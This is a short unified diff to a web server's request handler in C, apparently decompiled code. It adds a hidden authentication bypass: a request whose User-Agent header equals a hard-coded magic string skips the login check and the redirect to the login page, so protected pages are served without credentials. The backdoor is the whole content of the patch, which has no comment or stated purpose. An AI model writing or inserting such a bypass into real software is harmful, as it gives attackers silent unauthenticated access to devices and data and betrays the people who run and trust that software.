@@ -1,0 +1,23 @@
+--- a/alpha.c
++++ b/alpha.c
+@@ -163,11 +163,16 @@
+     pcVar1 = strstr(hc->origfilename, "public/");
+     iVar4 = 1;
+     if (pcVar1 == (char *)0x0) {
+-      bVar3 = check_logined(hc->client_addr.sa_in.sin_addr.s_addr, hc->cookie);
++      iVar2 = strcmp(hc->useragent, "xmlset_roodkcableoj28840ybtide");
+       iVar4 = 1;
+-      if (bVar3 == 0) {
+-        redirect_htm(hc, "/public/login.htm");
+-        iVar4 = -1;
++      if (iVar2 != 0) {
++        bVar3 =
++            check_logined(hc->client_addr.sa_in.sin_addr.s_addr, hc->cookie);
++        iVar4 = 1;
++        if (bVar3 == 0) {
++          redirect_htm(hc, "/public/login.htm");
++          iVar4 = -1;
++        }
+       }
+     }
+   }
